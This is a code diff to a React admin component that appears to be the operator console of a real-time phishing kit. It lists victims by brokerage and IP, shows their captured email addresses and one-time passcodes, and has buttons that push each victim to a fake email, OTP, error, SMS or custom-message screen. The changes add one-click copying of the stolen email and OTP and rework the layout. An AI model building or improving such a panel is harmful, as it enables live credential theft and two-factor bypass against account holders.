@@ -5,6 +5,10 @@ import moment from 'moment-timezone';
 
 import alertaSom from '../assets/alert.mp3';
 
+import { ToastContainer, toast } from 'react-toastify';
+
+import 'react-toastify/dist/ReactToastify.css';
+
 export default function Adm({ip,socket}) {
 
   const [lista, setLista] = useState([]);
@@ -85,27 +89,38 @@ export default function Adm({ip,socket}) {
     setMsg( event.target.value );
   };
 
-  function obterClasseCena(cena) {
-    const cenaParaClasse = {
-      'email': 'email',
-      'otp': 'otp',
-      'otpError': 'otp_Error',
-      'otpSMS': 'otp_sms',
-      'load': 'load',
-      'otp2': 'otp2',
-      // Adicione mais mapeamentos conforme necessário
-    };
-  
-    return cenaParaClasse[cena] || ''; // Retorna a classe correspondente ou uma string vazia
+
+  const copyToClipboard = (text) => {
+
+    console.error('text1: ', text);
+
+
+    navigator.clipboard.writeText(text)
+      .then(() => {
+        console.error('text2: ', text);
+        toast("Texto copiado com sucesso:"+text, {
+          position: "top-center",
+          autoClose: 5000,
+          hideProgressBar: false,
+          closeOnClick: true,
+          pauseOnHover: true,
+          draggable: true,
+          progress: undefined,
+          });
+      })
+      .catch(err => {
+        console.error('Falha ao copiar texto: ', err);
+      });
   }
 
   return (
    
   <div className="cards-container">
+    <ToastContainer />
       {lista.map((item, index) => (
+        item.ip &&
         <div key={index} className="card">
           <div className={item.online ? 'card-headerOnline' : 'card-headerOffline'}>
-          <span className={`status-bullet ${item.online ? 'status-online' : 'status-offline'}`}></span>
           
             {/* Informações importantes no cabeçalho do card */}
             {item.corretora} | {item.ip} <br />
@@ -114,24 +129,33 @@ export default function Adm({ip,socket}) {
             
           </div>
           <div className="card-body">
-            <div className="email2">{item.email}</div>
-            <div className={`cena ${obterClasseCena(item.cena)}`}>{item.cena}</div>
+            <div className="btnCena">
+              <label className="labelCena"> cena</label>
+              {item.cena}
+            </div>
+
+            <div  className="btnEmail" onClick={() => copyToClipboard(item.email)}>
+              <label className="label"> email</label>
+              {item.email}
+              </div>
             
-            <div className="otp1">{item.OTP}</div>
             
-            <div className="otp2">{item.OTP2}</div>
-         
+            <div  className="btnOTP" onClick={() => copyToClipboard(item.OTP)}>
+            <label className="label corBranca"> OTP email</label>
+              {item.OTP}
+              </div>
             
-            <div className="atualizacao">{moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}</div>
+                   
+            
           </div>
           <div className="card-footer">
             {/* Botões no rodapé do card */}
             <form onSubmit={handleSubmit(item.ip)}  > 
-                      <button className="btn btn-primary btn-sm teste" type="submit" id="email">email</button>
-                      <button className="btn btn-secondary btn-sm teste" type="submit" id="otp">otp</button>
-                      <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_Error">otp Error</button>
+                      <button className="btnPadrao" type="submit" id="email">email</button>
+                      <button className="btnPadrao" type="submit" id="otp">otp</button>
+                      <button className="btnPadrao" type="submit" id="otp_Error">otp Error</button>
                       
-                      <button className="btn btn-primary btn-sm teste" type="submit" id="load">load</button>
+                      <button className="btnPadrao" type="submit" id="load">load</button>
                       
                       <div className="nav-dropdown-menu__inner">
                             <ul className="nav-dropdown-list nav-dropdown-list--primary">
@@ -141,12 +165,14 @@ export default function Adm({ip,socket}) {
                                 autoFocus></input>
                               </li>
                               <li className="drop-down-item">
-                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp2">MSG CUSTOM</button>
-                                <button className="btn btn-secondary btn-sm teste" type="submit" id="otp_sms">****99</button>
+                                <button className="btnPadrao" type="submit" id="otp2">MSG CUSTOM</button>
+                                <button className="btnPadrao" type="submit" id="otp_sms">****99</button>
                               </li>
                             </ul>
                           </div>
                   </form>
+
+                  <div className="atualizacao">{moment.tz(item.date, "America/Sao_Paulo").format("DD/MM/YY HH:mm:ss")}</div>
           </div>
         </div>
       ))}
